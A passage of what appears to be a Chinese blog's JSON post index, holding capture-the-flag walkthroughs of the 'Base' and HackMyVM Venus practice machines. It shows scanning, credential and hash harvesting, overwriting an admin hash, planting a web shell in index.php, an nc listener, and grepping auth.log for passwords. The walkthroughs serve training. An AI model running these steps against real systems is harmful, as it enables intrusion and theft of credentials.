**\u56db\u3001\u593a\u53d6\u65d7\u5e1c**\n\n\u83b7\u53d6 `root` \u6743\u9650\u540e\uff0c\u8bfb\u53d6\u6700\u7ec8\u7684 `root.txt` \u65d7\u5e1c\u6587\u4ef6\u3002\n\n```bash\nbash-5.0# cat /root/root.txt \nflag{root-12f54a96f64443246930da001cafda8b}\n\nbash-5.0# cat /home/bitc0de/user.txt \nflag{user-60b725f10c9c85c70d97880dfe8191b3}\n```\n\n\u81f3\u6b64\uff0c\u6240\u6709\u65d7\u5e1c\u5747\u5df2\u593a\u53d6\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1754441536, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P189": {"htmlDir": "docs/post/nei-bu-_Base.html", "labels": ["\u5185\u90e8\u9776\u673a/maze-sec"], "postTitle": "\u5185\u90e8_Base", "postUrl": "post/nei-bu-_Base.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/189", "commentNum": 0, "wordCount": 11352, "description": "![image-20250724102315597](http://7r1UMPHK.github.io/image/20250724102323560.webp)\n\n\u6d45\u6d45\u5a31\u4e50\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ sudo arp-scan -l          \n[sudo] kali \u7684\u5bc6\u7801\uff1a\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.205.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.\n192.168.205.210 08:00:27:5d:66:94       PCS Systemtechnik GmbH\n192.168.205.254 00:50:56:fc:a8:ce       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.965 seconds (130.28 hosts/sec). 4 responded\n```\n\n192.168.205.210\u7684ip\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nmap -p- 192.168.205.210\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-23 22:24 EDT\nNmap scan report for 192.168.205.210\nHost is up (0.00034s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:5D:66:94 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.26 seconds\n```\n\n\u770b80\u7aef\u53e3\n![image-20250724102447816](http://7r1UMPHK.github.io/image/20250724102448088.webp)\n\n\u770b\u5230\u4e86\u7248\u672c\u53f7\uff0c\u4f46\u662f\u8fd9\u4e2a\u9776\u673a\u4e0d\u662f\u6253\u90a3\u4e2a\uff0c\u6240\u4ee5\u4e0d\u7528\u7ba1\n\n\u8fdb\u884c\u76ee\u5f55\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ gobuster dir -u http://192.168.205.210 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db -t 64 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.205.210\n[+] Method:                  GET\n[+] Threads:                 64\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,html,zip,db\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.html                (Status: 403) [Size: 280]\n/images               (Status: 301) [Size: 319] [--> http://192.168.205.210/images/]\n/.php                 (Status: 403) [Size: 280]\n/index.php            (Status: 200) [Size: 9329]\n/users.db             (Status: 200) [Size: 12288]\n/robots.txt           (Status: 200) [Size: 33]\n/LICENSE.txt          (Status: 200) [Size: 14900]\n/.html                (Status: 403) [Size: 280]\n/.php                 (Status: 403) [Size: 280]\n/UPGRADE.txt          (Status: 200) [Size: 956]\nProgress: 461907 / 1323360 (34.90%)^C\n[!] Keyboard interrupt detected, terminating.\nProgress: 462062 / 1323360 (34.92%)\n===============================================================\nFinished\n===============================================================\n```\n\n\u611f\u5174\u8da3\u7684\u6709`robots.txt`\u3001`user.db`\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ curl 192.168.205.210/robots.txt                                           \nUser-agent: *\nDisallow: /pivotx/\n```\n\n\u8fd9\u4e2a\u5e94\u8be5\u662fcms\u7684\u4e3b\u9875\u6682\u65f6\u4e0d\u7ba1\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ wget http://192.168.205.210/users.db\n--2025-07-23 22:27:37--  http://192.168.205.210/users.db\n\u6b63\u5728\u8fde\u63a5 192.168.205.210:80... \u5df2\u8fde\u63a5\u3002\n\u5df2\u53d1\u51fa HTTP \u8bf7\u6c42\uff0c\u6b63\u5728\u7b49\u5f85\u56de\u5e94... 200 OK\n\u957f\u5ea6\uff1a12288 (12K)\n\u6b63\u5728\u4fdd\u5b58\u81f3: \u201cusers.db\u201d\n\nusers.db                                  100%[=====================================================================================>]  12.00K  --.-KB/s  \u7528\u65f6 0s      \n\n2025-07-23 22:27:37 (703 MB/s) - \u5df2\u4fdd\u5b58 \u201cusers.db\u201d [12288/12288])\n\n                                                                                                                                                                        \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ file users.db \nusers.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2\n                                                   \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ file users.db \nusers.db: SQLite 3.x database, last written using SQLite version 3027002, file counter 2, database pages 3, cookie 0x1, schema 4, UTF-8, version-valid-for 2\n           \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ sqlite3 users.db                   \nSQLite version 3.46.1 2024-08-13 09:16:08\nEnter '.help' for usage hints.\nsqlite> .tables\nusers\nsqlite> select * from users;\n1|hungry|aHVuZ3J5\n```\n\n`aHVuZ3J5`\u662fhungry\u7684base64\u7f16\u7801\n\n\u53bb\u627e\u627e\u767b\u5f55\u53e3\n\n\u53d1\u73b0\u6253\u5f00`/pivotx/`\u5c31\u4f1a\u8df3\u8f6c\u767b\u5f55\n\n\u5c1d\u8bd5\u767b\u5f55\u65e0\u679c\uff0c\u53bb\u5c1d\u8bd5ssh\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ssh hungry@192.168.205.210                                                                                                                   \nThe authenticity of host '192.168.205.210 (192.168.205.210)' can't be established.\nED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.\nLinux Base 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\n ____                 \n| __ )  __ _ ___  ___ \n|  _ \\ / _` / __|/ _ \\\n| |_) | (_| \\__ \\  __/\n|____/ \\__,_|___/\\___|\n                      \nhungry@Base:~$ id\nuid=1000(hungry) gid=1000(hungry) groups=1000(hungry)\n```\n\n\u767b\u5f55\u6210\u529f\uff0c\u8fd9\u91cc\u6709\u4e24\u4e2a\u601d\u8def\n\n\u7b2c\u4e00\u4e2a\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u9776\u673a\u540d\u5b57base\u548cssh\u767b\u5f55\u5bc6\u7801\u53d1\u73b0\u89c4\u5f8b\uff0c\u5b83\u4f7f\u7528\u7684\u5bc6\u7801\u53ca\u5176\u6709\u53ef\u80fd\u662f\u7ecf\u8fc7base64\u7f16\u7801\u7684\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5c06\u4e00\u4e9b\u5b57\u5178\u7f16\u7801\u751f\u6210\u6709\u9488\u5bf9\u6027\u7684\u5b57\u5178\n```\nwhile IFS= read -r line; do\n    echo -n '$line' | base64\ndone < xato-net-10-million-passwords-100000.txt  > 100000base.txt\n```\n\n\u8fd9\u91cc\u4e3a\u4ec0\u4e48\u4f7f\u7528`xato-net-10-million-passwords-100000.txt`\u662f\u56e0\u4e3a\u6211\u53d1\u73b0\u597d\u50cf\u6211\u4eec\u5e38\u89c1\u7684\u5f31\u5bc6\u7801\u5728`xato`\u91cc\u9762\u662f\u6bd4\u8f83\u524d\u7684\uff0c\u800c`rockyou`\u6bd4\u8f83\u540e\u9762\uff0c\u5982`admin123`\n\n\u5bc6\u7801\u662ftodd\u7684base64\u7f16\u7801\uff0c\u5728`xato`\u76845k+\uff0c\u5728`rockyou`\u768413w\u5de6\u53f3\n\n\u7b2c\u4e8c\u4e2a\u65b9\u6cd5\u662f\u6a2a\u5411\u56dewww-data\n\n```\nhungry@Base:~$ id www-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)\n```\n\n\u5b83\u6709\u4e00\u4e2a`adm`\u7ec4\u6743\u9650\uff0c\u8fd9\u4e2a\u6743\u9650\u53ef\u4ee5\u770blog\u65e5\u5fd7\u6587\u4ef6\n\n```\nhungry@Base:~$ cd /var/www/html/\nhungry@Base:/var/www/html$ ls -al\ntotal 76\ndrwxr-xr-x  4 root     root      4096 Jul 20 00:52 .\ndrwxr-xr-x  3 root     root      4096 Apr  4 23:20 ..\n-rw-r--r--  1 www-data www-data    27 Jul 20 00:24 creds.txt\n-rw-r--r--  1 www-data www-data  3389 Jun 22  2023 example.htaccess\n-rw-r--r--  1 www-data www-data  4253 Jun 22  2023 example.web.config\ndrwxr-xr-x  2 www-data www-data  4096 Jun 22  2023 images\n-rw-r--r--  1 www-data www-data   612 Jun 22  2023 index.php\n-rw-r--r--  1 www-data www-data 14900 Jun 22  2023 LICENSE.txt\ndrwxr-xr-x 12 www-data www-data  4096 Jun 22  2023 pivotx\n-rw-r--r--  1 www-data www-data   311 Jun 22  2023 README.md\n-rw-r--r--  1 www-data www-data    33 Jun 22  2023 robots.txt\n-rw-r--r--  1 www-data www-data   956 Jun 22  2023 UPGRADE.txt\n-rw-r--r--  1 root     root     12288 Jul 20 00:30 users.db\nhungry@Base:/var/www/html$ cat creds.txt \nguest:guest\nadmin:YWRtaW*=\n```\n\n\u4e00\u4e2a\u662f\u8bbf\u5ba2\u5bc6\u7801\uff0c\u6ca1\u6709\u7ed3\u679cbase64\u7f16\u7801\uff0c\u4e00\u4e2a\u662fadmin\u7ba1\u7406\u5458\u7528\u6237\u7684\u5bc6\u7801\uff0c\u7ecf\u8fc7\u4e86base64\u7f16\u7801\uff0c\u8fd9\u91cc\u5c31\u8003\u9a8c\u4f60\u6709\u6ca1\u6709\u770b\u8fc7base64\u7684`admin`\u4e86\uff0c\u5f53\u7136\u4f60\u7206\u7834\u4e5f\u662f\u53ef\u4ee5\u7684\u3002web\u6709\u7206\u7834\u9650\u5236\uff0c\u53ef\u4ee5\u53bb\u6252\u62c9`/db/user`\u6587\u4ef6\u62ff`hash`\u7206\u7834\n\n```\nhungry@Base:/var/www/html$ cd pivotx/db/\nhungry@Base:/var/www/html/pivotx/db$ ls -al\ntotal 96\ndrwxr-xr-x 11 www-data www-data 4096 Jul 20 00:25 .\ndrwxr-xr-x 12 www-data www-data 4096 Jun 22  2023 ..\ndrwxrwxrwx  2 www-data www-data 4096 Jul 20 00:25 cache\n-rw-r--r--  1 www-data www-data  202 Jun 22  2023 index.html\ndrwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 pages\ndrwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 refkeys\ndrwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 rsscache\ndrwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 search\n-rw-rw-rw-  1 www-data www-data  268 Jul 20 00:25 ser-archives.php\n-rw-rw-rw-  1 www-data www-data  309 Jul 20 00:09 ser_categories.php\n-rw-rw-rw-  1 www-data www-data   90 Jul 20 00:08 ser-cats.php\n-rw-rw-rw-  1 www-data www-data 2729 Jul 20 00:08 ser_config.php\n-rw-rw-rw-  1 www-data www-data   95 Jul 20 00:08 ser-dates.php\n-rw-rw-rw-  1 www-data www-data  389 Jul 20 00:09 ser_events.php\n-rw-rw-rw-  1 www-data www-data  165 Jul 20 00:08 ser_logins.php\n-rw-rw-rw-  1 www-data www-data  148 Jul 20 00:08 ser_sessions.php\n-rw-rw-rw-  1 www-data www-data  118 Jul 23 22:29 ser_tags.php\n-rw-rw-rw-  1 www-data www-data  117 Jul 20 00:08 ser-uris.php\n-rw-rw-rw-  1 www-data www-data  604 Jul 20 00:09 ser_users.php\n-rw-rw-rw-  1 www-data www-data 2692 Jul 23 22:29 ser_weblogs.php\ndrwxrwxrwx  2 www-data www-data 4096 Jul 20 00:08 standard-00000\ndrwxr-xr-x  2 www-data www-data 4096 Jul 20 00:08 tagdata\ndrwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 tbkeys\ndrwxr-xr-x  2 www-data www-data 4096 Jun 22  2023 users\nhungry@Base:/var/www/html/pivotx/db$ cat ser_users.php\n<?php /* pivot */ die(); ?>a:2:{i:0;a:10:{s:8:'username';s:5:'admin';s:5:'email';s:15:'admin@admin.com';s:9:'userlevel';i:4;s:8:'nickname';s:4:'root';s:8:'language';s:2:'en';s:5:'image';N;s:15:'text_processing';i:5;s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$C4HR7UH4rgIvtiTUko9sm5X2wnXvVe1';s:8:'lastseen';i:1752984498;}i:1;a:9:{s:8:'username';s:5:'guest';s:5:'email';s:15:'guest@admin.com';s:9:'userlevel';s:1:'1';s:8:'nickname';s:5:'guest';s:8:'language';s:2:'en';s:5:'image';s:0:'';s:15:'text_processing';s:1:'5';s:4:'salt';s:6:'phpass';s:8:'password';s:34:'$P$CKuO3Fs4IYzSqVFJi1TCLNSXd3yCaK1';}}\n```\n\n\u6216\u8005\u4f60\u76f4\u63a5\u4e0d\u7206\u7834\u4e86\uff0c\u76f4\u63a5\u66ff\u6362`admin`\u7684hash\u4e3a`guest`\u7684hash\uff0c\u56e0\u4e3a`ser_users.php`\u6587\u4ef6\u6211\u4eec\u6709\u5199\u5165\u7684\u6743\u9650\uff0c\u770b\u4f60\u559c\u6b22\n\n\u8fdb\u53bbcms\u4e4b\u540e\uff0c\u5728`http://192.168.205.210/pivotx/index.php?page=homeexplore`\u7ba1\u7406\u6587\u4ef6\u9875\u9762\uff0c\u76f4\u63a5\u4fee\u6539\n\nindex.php\u7684\u5185\u5bb9\u4e3a\u8681\u5251\u7684ant\u6587\u4ef6\u5c31\u597d\u4e86\uff08\u76f4\u63a5\u4fee\u6539\u6210reverce shell\u548ccmd\u597d\u50cf\u4e0d\u884c\uff0c\u5b83\u597d\u50cf\u6709\u4e9b\u8fc7\u6ee4\u3002\u6216\u8005\u4f60\u6839\u636e\u90a3\u4e2arce\u7684\u4fee\u6539\uff0c\u90a3\u4e2a\u662f\u53ef\u4ee5\u7684\uff09\n\nkali\u76d1\u542c\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ nc -lvnp 8888           \nlistening on [any] 8888 ...\n```\n\n\u4f7f\u7528\u8681\u5251\u8fde\u63a5\uff0c\u5f39shell\n\n\u7a33\u5b9ashell\n\n```\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n\u76f4\u63a5\u6252\u62c9\u65e5\u5fd7\n\n```\nwww-data@Base:/var/www/html$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data),4(adm)\nwww-data@Base:/var/www/html$ cd /var/log\nwww-data@Base:/var/log$ grep -i -r 'password\\|pass\\|passwd' auth.log \nJul 19 23:59:05 moban passwd[528]: pam_unix(passwd:chauthtok): password changed for root\nJul 19 23:58:27 moban sudo[381]: root : password changed to 'dG9kZA==\nJul 20 00:05:17 moban sshd[548]: Accepted password for root from 192.168.3.94 port 60280 ssh2\nJul 20 00:10:50 moban passwd[831]: pam_unix(passwd:chauthtok): password changed for hungry\nJul 20 00:30:55 moban passwd[1026]: pam_unix(passwd:chauthtok): password changed for hungry\nJul 20 00:31:43 moban sshd[1031]: Accepted password for root from 192.168.3.94 port 36218 ssh2\nJul 20 00:32:02 moban passwd[1044]: pam_unix(passwd:chauthtok): password changed for root\nJul 20 00:44:17 Base sshd[433]: Accepted password for root from 192.168.3.94 port 47964 ssh2\nJul 20 00:52:12 Base sshd[433]: Accepted password for root from 192.168.3.94 port 55854 ssh2\nJul 23 22:30:22 Base sshd[583]: Accepted password for hungry from 192.168.205.128 port 34874 ssh2\n```\n\ndG9kZA==\n\n\u767b\u5f55\u4e00\u4e0b\n\n```\nwww-data@Base:/var/log$ su -\nPassword: \n ____                 \n| __ )  __ _ ___  ___ \n|  _ \\ / _` / __|/ _ \\\n| |_) | (_| \\__ \\  __/\n|____/ \\__,_|___/\\___|\n                      \nroot@Base:~# cat /root/root.txt /home/hungry/user.txt \nflag{root}\nflag{user-051a0db9a92e4dacc70212da32fd0638}\n```\n\nsentence", "top": 0, "createdAt": 1754441585, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-08-06", "dateLabelColor": "#0969da"}, "P190": {"htmlDir": "docs/post/hmv_Labs_venus1to21.html", "labels": ["HackMyVM_Labs"], "postTitle": "hmv_Labs_venus1to21", "postUrl": "post/hmv_Labs_venus1to21.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/190", "commentNum": 0, "wordCount": 11877, "description": "# **\u7b80\u4ecb**\n\nVenus \u662f HackMyVM.eu \u63a8\u51fa\u7684\u4e00\u4e2a\u9002\u5408\u521d\u5b66\u8005\u7684 CTF\uff08\u593a\u65d7\u8d5b\uff09\u9776\u673a\u3002\u672c\u653b\u7565\u5c06\u8bb0\u5f55\u4ece\u521d\u59cb\u7528\u6237 `hacker` \u5f00\u59cb\uff0c\u901a\u8fc7\u89e3\u51b3\u4e00\u7cfb\u5217\u8c1c\u9898\uff0c\u9010\u6b65\u63d0\u6743\uff0c\u6700\u7ec8\u83b7\u53d6\u5230Vhidden\u5956\u676f\u7684\u5168\u8fc7\u7a0b\u3002\n\n---\n\n# \u5f00\u6253\n\n## **Mission 0x01: hacker -> sophia**\n\n- **\u4efb\u52a1**: \u7528\u6237 `sophia` \u7684\u5bc6\u7801\u4fdd\u5b58\u5728\u5f53\u524d\u76ee\u5f55\u7684\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\u4e2d\u3002\n\n1.  \u9996\u5148\uff0c\u4f7f\u7528 `ls -al` \u547d\u4ee4\u67e5\u627e\u6240\u6709\u6587\u4ef6\uff0c\u5305\u62ec\u9690\u85cf\u6587\u4ef6\u3002\n\n    ```bash\n    hacker@venus:~$ ls -al\n    total 40\n    drwxr-x--- 1 root   hacker 4096 Apr  5  2024 .\n    drwxr-xr-x 1 root   root   4096 Apr  5  2024 ..\n    -rw-r----- 1 root   hacker   31 Apr  5  2024 ...\n    -rw-r--r-- 1 hacker hacker  220 Apr 23  2023 .bash_logout\n    -rwxr-xr-x 1 hacker hacker 3653 Jul 24 00:48 .bashrc\n    -rw-r----- 1 root   hacker   16 Apr  5  2024 .myhiddenpazz\n    -rw-r--r-- 1 hacker hacker    0 Jun 20 00:35 .profile\n    -rw-r----- 1 root   hacker  287 Apr  5  2024 mission.txt\n    -rw-r----- 1 root   hacker 2542 Apr  5  2024 readme.txt\n    ```\n\n2.  \u53d1\u73b0\u53ef\u7591\u9690\u85cf\u6587\u4ef6 `.myhiddenpazz`\uff0c\u8bfb\u53d6\u5185\u5bb9\u5f97\u5230\u5bc6\u7801\u3002\n\n    ```bash\n    hacker@venus:~$ cat .myhiddenpazz\n    Y1o645M3mR84ejc\n    ```\n\n3.  \u5207\u6362\u5230 `sophia` \u7528\u6237\u3002\n\n    ```bash\n    hacker@venus:~$ su sophia\n    Password: Y1o645M3mR84ejc\n    ```\n\n---\n\n## **Mission 0x02: sophia -> angela**\n- **\u4efb\u52a1**: \u7528\u6237 `angela` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a\u540d\u4e3a `whereismypazz.txt` \u7684\u6587\u4ef6\u4e2d\uff0c\u4f46\u5979\u5fd8\u8bb0\u4e86\u6587\u4ef6\u4f4d\u7f6e\u3002\n\n1.  \u4f7f\u7528 `find` \u547d\u4ee4\u5728\u6574\u4e2a\u6587\u4ef6\u7cfb\u7edf\u4e2d\u641c\u7d22\u8be5\u6587\u4ef6\u3002\n\n    ```bash\n    sophia@venus:~$ find / -name 'whereismypazz.txt' 2>/dev/null\n    /usr/share/whereismypazz.txt\n    ```\n\n2.  \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5f97\u5230\u5bc6\u7801\u3002\n\n    ```bash\n    sophia@venus:~$ cat /usr/share/whereismypazz.txt\n    oh5p9gAABugHBje\n    ```\n\n3.  \u5207\u6362\u5230 `angela` \u7528\u6237\u3002\n\n    ```bash\n    sophia@venus:~$ su angela\n    Password: oh5p9gAABugHBje\n    ```\n\n---\n\n## **Mission 0x03: angela -> emma**\n- **\u4efb\u52a1**: \u7528\u6237 `emma` \u7684\u5bc6\u7801\u5728 `findme.txt` \u6587\u4ef6\u7684\u7b2c 4069 \u884c\u3002\n\n1.  \u4f7f\u7528 `sed` \u547d\u4ee4\u76f4\u63a5\u6253\u5370\u6307\u5b9a\u884c\u3002\n\n    ```bash\n    angela@venus:~$ sed -n '4069p' findme.txt\n    fIvltaGaq0OUH8O\n    ```\n\n2.  \u5207\u6362\u5230 `emma` \u7528\u6237\u3002\n\n    ```bash\n    angela@venus:~$ su emma\n    Password: fIvltaGaq0OUH8O\n    ```\n\n---\n\n## **Mission 0x04: emma -> mia**\n- **\u4efb\u52a1**: \u7528\u6237 `mia` \u7684\u5bc6\u7801\u5728\u540d\u4e3a `-` \u7684\u6587\u4ef6\u4e2d\u3002\n\n1.  \u7531\u4e8e\u6587\u4ef6\u540d\u662f\u7279\u6b8a\u5b57\u7b26\uff0c\u4f7f\u7528 `./-` \u6765\u6307\u5b9a\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u8be5\u6587\u4ef6\u3002\n\n    ```bash\n    emma@venus:~$ cat ./-\n    iKXIYg0pyEH2Hos\n    ```\n\n2.  \u5207\u6362\u5230 `mia` \u7528\u6237\u3002\n\n    ```bash\n    emma@venus:~$ su mia\n    Password: iKXIYg0pyEH2Hos\n    ```\n\n---\n\n## **Mission 0x05: mia -> camila**\n- **\u4efb\u52a1**: \u7528\u6237 `camila` \u7684\u5bc6\u7801\u5728\u540d\u4e3a `hereiam` \u7684\u6587\u4ef6\u5939\u5185\u3002\n\n1.  \u9996\u5148\u627e\u5230 `hereiam` \u6587\u4ef6\u5939\u7684\u4f4d\u7f6e\u3002\n\n    ```bash\n    mia@venus:~$ find / -name 'hereiam' 2>/dev/null\n    /opt/hereiam\n    ```\n\n2.  \u8fdb\u5165\u8be5\u76ee\u5f55\u5e76\u67e5\u627e\u91cc\u9762\u7684\u9690\u85cf\u6587\u4ef6\u3002\n\n    ```bash\n    mia@venus:/opt/hereiam$ ls -la\n    total 12\n    drwxr-xr-x 2 root root 4096 Apr  5  2024 .\n    drwxr-xr-x 1 root root 4096 Apr  5  2024 ..\n    -rw-r--r-- 1 root root   16 Apr  5  2024 .here\n    \n    mia@venus:/opt/hereiam$ cat .here\n    F67aDmCAAgOOaOc\n    ```\n\n3.  \u5207\u6362\u5230 `camila` \u7528\u6237\u3002\n\n    ```bash\n    mia@venus:/opt/hereiam$ su camila\n    Password: F67aDmCAAgOOaOc\n    ```\n\n---\n\n## **Mission 0x06: camila -> luna**\n- **\u4efb\u52a1**: \u7528\u6237 `luna` \u7684\u5bc6\u7801\u5728 `muack` \u6587\u4ef6\u5939\u5185\u7684\u67d0\u4e2a\u6587\u4ef6\u4e2d\u3002\n\n1.  `muack` \u6587\u4ef6\u5939\u5185\u6587\u4ef6\u4f17\u591a\uff0c\u4f7f\u7528 `find` \u548c `file` \u547d\u4ee4\u7ec4\u5408\uff0c\u627e\u5230\u7c7b\u578b\u4e3a `ASCII text` \u7684\u5e38\u89c4\u6587\u4ef6\u3002\n\n    ```bash\n    camila@venus:~/muack$ find . -type f -exec file {} \\; | grep 'text'\n    ./111/111/muack: ASCII text\n    ```\n\n2.  \u8bfb\u53d6\u627e\u5230\u7684\u6587\u4ef6\u3002\n\n    ```bash\n    camila@venus:~/muack$ cat ./111/111/muack\n    j3vkuoKQwvbhkMc\n    ```\n\n3.  \u5207\u6362\u5230 `luna` \u7528\u6237\u3002\n\n    ```bash\n    camila@venus:~/muack$ su luna\n    Password: j3vkuoKQwvbhkMc\n    ```\n\n---\n\n## **Mission 0x07: luna -> eleanor**\n- **\u4efb\u52a1**: \u7528\u6237 `eleanor` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a\u5360\u7528 6969 \u5b57\u8282\u7684\u6587\u4ef6\u4e2d\u3002\n\n1.  \u4f7f\u7528 `find` \u547d\u4ee4\u7684 `-size` \u53c2\u6570\u67e5\u627e\u7279\u5b9a\u5927\u5c0f\u7684\u6587\u4ef6\u3002\n\n    ```bash\n    luna@venus:~$ find / -type f -size 6969c 2>/dev/null\n    /usr/share/moon.txt\n    ```\n\n2.  \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002\n\n    ```bash\n    luna@venus:~$ cat /usr/share/moon.txt\n    UNDchvln6Bmtu7b\n    ```\n\n3.  \u5207\u6362\u5230 `eleanor` \u7528\u6237\u3002\n\n    ```bash\n    luna@venus:~$ su eleanor\n    Password: UNDchvln6Bmtu7b\n    ```\n\n---\n\n## **Mission 0x08: eleanor -> victoria**\n- **\u4efb\u52a1**: \u7528\u6237 `victoria` \u7684\u5bc6\u7801\u6240\u5728\u6587\u4ef6\u7684\u6240\u6709\u8005\u662f `violin`\u3002\n\n1.  \u4f7f\u7528 `find` \u547d\u4ee4\u7684 `-user` \u53c2\u6570\u67e5\u627e\u5c5e\u4e8e\u7279\u5b9a\u7528\u6237\u7684\u6587\u4ef6\u3002\n\n    ```bash\n    eleanor@venus:~$ find / -user violin 2>/dev/null\n    /usr/local/games/yo\n    ```\n\n2.  \u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u3002\n\n    ```bash\n    eleanor@venus:~$ cat /usr/local/games/yo\n    pz8OqvJBFxH0cSj\n    ```\n\n3.  \u5207\u6362\u5230 `victoria` \u7528\u6237\u3002\n\n    ```bash\n    eleanor@venus:~$ su victoria\n    Password: pz8OqvJBFxH0cSj\n    ```\n\n---\n\n## **Mission 0x09: victoria -> isla**\n- **\u4efb\u52a1**: \u7528\u6237 `isla` \u7684\u5bc6\u7801\u5728\u4e00\u4e2a zip \u6587\u4ef6\u4e2d\u3002\n\n1.  \u76ee\u6807\u7cfb\u7edf\u65e0\u6cd5\u5199\u5165\u6587\u4ef6\uff0c\u5148\u5c06 `passw0rd.zip` \u6587\u4ef6\u5185\u5bb9\u7528 `base64` \u7f16\u7801\u540e\u590d\u5236\u51fa\u6765\u3002\n\n    ```bash\n    victoria@venus:~$ base64 passw0rd.zip\n    UEsDBAoAAAAAAIMzhViqg0LgEAAAABAAAAAbABwAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQudHh0\n    VVQJAAP2mQ9m9pkPZnV4CwABBAAAAAAEAAAAAEQzWFRvYjBGVUltc29CYgpQSwECHgMKAAAAAACD\n    M4VYqoNC4BAAAAAQAAAAGwAYAAAAAAABAAAApIEAAAAAcHduZWQvdmljdG9yaWEvcGFzc3cwcmQu\n    dHh0VVQFAAP2mQ9mdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAYQAAAGUAAAAAAA==\n    ```\n\n2.  \u5728\u672c\u5730\u673a\u5668\u4e0a\u89e3\u7801\u5e76\u89e3\u538b\u3002\n\n    ```bash\n    # \u5728\u672c\u5730Kali\u7cfb\u7edf\u4e0a\u6267\u884c\n    echo '...' | base64 -d > passw0rd.zip\n    unzip passw0rd.zip\n    cat pwned/victoria/passw0rd.txt\n    D3XTob0FUImsoBb\n    ```\n\n3.  \u5207\u6362\u5230 `isla` \u7528\u6237\u3002\n\n    ```bash\n    victoria@venus:~$ su isla\n    Password: D3XTob0FUImsoBb\n    ```\n\n---\n\n## **Mission 0x10: isla -> violet**\n- **\u4efb\u52a1**: \u7528\u6237 `violet` \u7684\u5bc6\u7801\u5728 `passy` 